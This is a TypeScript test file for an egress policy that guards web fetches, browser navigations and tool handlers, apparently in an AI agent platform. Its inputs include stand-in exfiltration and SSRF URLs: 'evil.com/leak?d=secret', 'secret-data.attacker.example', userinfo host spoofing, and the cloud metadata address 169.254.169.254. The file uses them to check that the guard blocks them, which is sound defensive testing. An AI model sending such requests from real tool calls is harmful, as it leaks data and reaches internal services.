/**
 * The egress policy on the fetch path: `fetchGuarded` (web fetch, vision,
 * plugin web:read) judges every hop, redirects included, against the policy,
 * inside a tool call — and a tool built on `BaseTool` is judged as itself.
 *
 * The network is faked at its two edges (DNS answers and `node:http`'s
 * request), so what is asserted is which hosts were actually contacted.
 */
import dns from 'node:dns';
import { EventEmitter } from 'node:events';
import { Readable } from 'node:stream';
import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import { egressPolicySchema } from '@/shared/egress-policy';

const state = vi.hoisted(() => ({
  policy: undefined as unknown,
  /** Host → what it answers: a redirect target or a body. */
  pages: {} as Record<string, { redirect?: string; body?: string }>,
  contacted: [] as string[],
  audits: [] as Array<Record<string, unknown>>,
}));

vi.mock('@/config', async (orig) => {
  const real = await orig<typeof import('@/config')>();
  return {
    ...real,
    getConfig: () => {
      let base: Record<string, any> = {};
      try { base = real.getConfig() as unknown as Record<string, any>; } catch { /* not loaded in this lane */ }
      return { ...base, security: { ...(base.security ?? {}), egressPolicy: state.policy } };
    },
  };
});

/** A `node:http(s)` request that answers from `state.pages` and records the host it was sent to. */
const fakeRequest = vi.hoisted(() => (url: string, _opts: unknown, cb: (res: unknown) => void) => FAKE_REQUEST.impl(url, cb));
const FAKE_REQUEST = vi.hoisted(() => ({ impl: (_url: string, _cb: (res: unknown) => void): unknown => { throw new Error('not set'); } }));
vi.mock('node:http', async (orig) => {
  const real = await orig<typeof import('node:http')>();
  return { ...real, default: { ...real, request: fakeRequest }, request: fakeRequest };
});
vi.mock('node:https', async (orig) => {
  const real = await orig<typeof import('node:https')>();
  return { ...real, default: { ...real, request: fakeRequest }, request: fakeRequest };
});

vi.mock('@/db/repositories/audit-repository', () => ({
  auditRepository: { log: async (entry: Record<string, unknown>) => { state.audits.push(entry); } },
}));

FAKE_REQUEST.impl = (url, cb) => {
  const req = new EventEmitter() as EventEmitter & Record<string, unknown>;
  req.write = () => true;
  req.destroy = () => req;
  req.end = () => {
    const host = new URL(url).hostname;
    state.contacted.push(host);
    const page = state.pages[host] ?? { body: 'ok' };
    const res = Object.assign(Readable.from(page.body ? [Buffer.from(page.body)] : []), {
      statusCode: page.redirect ? 302 : 200, statusMessage: page.redirect ? 'Found' : 'OK',
      headers: page.redirect ? { location: page.redirect } : { 'content-type': 'text/plain' },
    });
    setImmediate(() => cb(res));
    return req;
  };
  return req;
};

const { fetchGuarded } = await import('@/utils/sanitize');
const { assertBrowserNavigationAllowed, EgressDeniedError, withEgressSubject } = await import('./egress-policy');

const PUBLIC = '93.184.216.34';

beforeEach(() => {
  state.policy = egressPolicySchema.parse({});
  state.pages = {};
  state.contacted = [];
  state.audits = [];
  vi.spyOn(dns.promises, 'resolve4').mockImplementation(async () => [PUBLIC]);
  vi.spyOn(dns.promises, 'resolve6').mockRejectedValue(new Error('no AAAA'));
});
afterEach(() => vi.restoreAllMocks());

const asTool = <T>(run: () => Promise<T>) => withEgressSubject({ tool: 'websearch', role: 'research', userId: 'u1', sessionId: 's1' }, run);

describe('fetchGuarded under the egress policy', () => {
  test('no policy configured: behaviour unchanged, redirects followed anywhere public', async () => {
    state.pages['start.example'] = { redirect: 'http://elsewhere.example/landing' };
    const res = await asTool(() => fetchGuarded('http://start.example/'));
    expect(await res.text()).toBe('ok');
    expect(state.contacted).toEqual(['start.example', 'elsewhere.example']);
  });

  test('a redirect to a denied host is refused before it is contacted, and audited without the path', async () => {
    state.policy = egressPolicySchema.parse({ rules: [{ action: 'deny', host: '*.tracker.example', note: 'no trackers' }] });
    state.pages['start.example'] = { redirect: 'http://a.TRACKER.example./collect?secret=1' };
    const err = await asTool(() => fetchGuarded('http://start.example/')).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(EgressDeniedError);
    expect((err as Error).message).toMatch(/a\.tracker\.example:80 \(http\) is denied by the operator's egress policy for tool websearch as role research/);
    expect((err as Error).message).toContain('no trackers');
    expect(state.contacted).toEqual(['start.example']);
    await vi.waitFor(() => expect(state.audits).toHaveLength(1));
    expect(state.audits[0]).toMatchObject({
      userId: 'u1', action: 'permission_denied', resourceType: 'egress', resourceId: 'a.tracker.example:80', sessionId: 's1',
      details: { host: 'a.tracker.example', port: 80, scheme: 'http', tool: 'websearch', role: 'research', path: 'fetch' },
    });
    expect(JSON.stringify(state.audits[0])).not.toContain('secret');
  });

  test('deny by default: only allowed hosts are fetched; userinfo cannot pose as the host', async () => {
    state.policy = egressPolicySchema.parse({ default: 'deny', rules: [{ action: 'allow', host: 'docs.example', schemes: ['https'] }] });
    await expect(asTool(() => fetchGuarded('https://docs.example/page'))).resolves.toBeDefined();
    await expect(asTool(() => fetchGuarded('https://docs.example@evil.example/'))).rejects.toThrow(/evil\.example:443/);
    await expect(asTool(() => fetchGuarded('http://docs.example/page'))).rejects.toThrow(/default \(deny\)/);
    expect(state.contacted).toEqual(['docs.example']);
  });

  test('an allowed name that resolves into a denied range is refused (judged on the pinned addresses)', async () => {
    state.policy = egressPolicySchema.parse({ rules: [{ action: 'allow', host: 'innocent.example' }, { action: 'deny', cidr: '93.184.216.0/24' }] });
    await expect(asTool(() => fetchGuarded('https://innocent.example/'))).rejects.toThrow(/deny 93\.184\.216\.0\/24/);
    expect(state.contacted).toEqual([]);
  });

  test('private addresses stay blocked by the SSRF guard whatever the policy allows', async () => {
    state.policy = egressPolicySchema.parse({ rules: [{ action: 'allow', cidr: '169.254.0.0/16' }, { action: 'allow', host: '127.0.0.1' }] });
    await expect(asTool(() => fetchGuarded('http://169.254.169.254/latest/meta-data/'))).rejects.toThrow(/SSRF guard/);
    await expect(asTool(() => fetchGuarded('http://127.0.0.1/'))).rejects.toThrow(/SSRF guard/);
  });

  test('under a deny default an unlisted name is refused before it is resolved (no DNS exfiltration)', async () => {
    state.policy = egressPolicySchema.parse({ default: 'deny', rules: [{ action: 'allow', host: 'docs.example' }] });
    const resolve4 = vi.mocked(dns.promises.resolve4);
    resolve4.mockClear();
    await expect(asTool(() => fetchGuarded('https://secret-data.attacker.example/'))).rejects.toThrow(/default \(deny\)/);
    expect(resolve4).not.toHaveBeenCalled();
    expect(state.contacted).toEqual([]);
  });

  test('traffic outside a tool call (providers, webhooks) is not judged by the tool policy', async () => {
    state.policy = egressPolicySchema.parse({ default: 'deny' });
    await expect(fetchGuarded('https://api.provider.example/v1/models')).resolves.toBeDefined();
    expect(state.contacted).toEqual(['api.provider.example']);
  });
});

describe('browser navigations (Playwright cannot be pinned)', () => {
  const navigation = (urls: string[], ip: string) => {
    type Hop = { url(): string; redirectedFrom(): Hop | null };
    let request: Hop | null = null;
    for (const url of urls) { const from: Hop | null = request; request = { url: () => url, redirectedFrom: () => from }; }
    return { request: () => request as never, serverAddr: async () => ({ ipAddress: ip }) };
  };

  const resolveHop = async (host: string) => (host === 'evil.com' ? ['203.0.113.50'] : [PUBLIC]);
  const subject = { tool: 'browser' };

  test('every redirect hop and the serving address are judged', async () => {
    state.policy = egressPolicySchema.parse({ rules: [{ action: 'deny', host: 'hop.example' }, { action: 'deny', cidr: '203.0.113.0/24' }] });
    await expect(assertBrowserNavigationAllowed(navigation(['https://a.example/', 'https://b.example/'], PUBLIC), subject, resolveHop)).resolves.toBeUndefined();
    await expect(assertBrowserNavigationAllowed(navigation(['https://a.example/', 'https://HOP.example./x', 'https://b.example/'], PUBLIC), subject, resolveHop)).rejects.toThrow(/hop\.example:443/);
    await expect(assertBrowserNavigationAllowed(navigation(['https://a.example/'], '203.0.113.9'), subject, resolveHop)).rejects.toThrow(/deny 203\.0\.113\.0\/24/);
  });

  test('a middle hop is judged with its addresses and the default, not by name alone', async () => {
    // The reviewer's chain: good.com → evil.com/leak → good.com under a deny default.
    state.policy = egressPolicySchema.parse({ default: 'deny', rules: [{ action: 'allow', host: 'good.com' }] });
    const chain = ['https://good.com/r', 'https://evil.com/leak?d=secret', 'https://good.com/final'];
    await expect(assertBrowserNavigationAllowed(navigation(chain, PUBLIC), subject, resolveHop)).rejects.toThrow(/evil\.com:443 .* default \(deny\)/);
    // An address deny on a middle hop applies even when its name is allowed.
    state.policy = egressPolicySchema.parse({ rules: [{ action: 'allow', host: 'evil.com' }, { action: 'deny', cidr: '203.0.113.0/24' }] });
    await expect(assertBrowserNavigationAllowed(navigation(chain, PUBLIC), subject, resolveHop)).rejects.toThrow(/deny 203\.0\.113\.0\/24/);
    // A hop that no longer resolves cannot be cleared by an address rule: refused.
    await expect(assertBrowserNavigationAllowed(navigation(chain, PUBLIC), subject, async () => { throw new Error('NXDOMAIN'); })).rejects.toThrow(/addresses are not known/);
  });

  test('no policy: the navigation is not even inspected', async () => {
    const untouched = { request: () => { throw new Error('inspected'); }, serverAddr: async () => null };
    await expect(asTool(() => assertBrowserNavigationAllowed(untouched))).resolves.toBeUndefined();
  });
});

describe('a BaseTool handler is judged as its tool', () => {
  test('the tool id and the caller role reach the policy; the model reads the refusal', async () => {
    vi.doMock('@/security/permissions', () => ({ getPermissionManager: () => ({ check: async () => ({ level: 'ALLOW', source: 'policy' }) }) }));
    vi.doMock('@/security/approval-route', () => ({ routeApprovalFor: async () => ({ route: 'execute', source: 'policy' }) }));
    const { BaseTool } = await import('@/tools/base-tool');
    class Fetcher extends BaseTool {
      readonly id = 'fetcher'; readonly name = 'fetcher'; readonly version = '1'; readonly description = 'Fetches';
      getManifest() { return { id: this.id, name: this.name, version: this.version, description: this.description, permissions: [], tools: [] }; }
      protected async registerTools() {
        this.registerTool('read', 'Fetch a page', { type: 'object' }, async (args) => (await fetchGuarded(String(args.url))).text(), { readOnly: true });
      }
    }
    const tool = new Fetcher();
    await tool.initialize();
    state.policy = egressPolicySchema.parse({ tools: { fetcher: { default: 'deny', rules: [{ action: 'allow', host: 'ok.example' }] } } });
    const [handler] = tool.getToolHandlers();
    const context = { id: 'agent-1', userId: 'u1', sessionId: 's1', role: 'coding', status: 'running' } as never;
    await expect(handler.execute({ url: 'https://ok.example/' }, context)).resolves.toBe('ok');
    await expect(handler.execute({ url: 'https://other.example/' }, context)).rejects.toThrow(/other\.example:443 \(https\) is denied by the operator's egress policy for tool fetcher as role coding — tool fetcher default \(deny\)/);
    expect(state.contacted).toEqual(['ok.example']);
  });
});
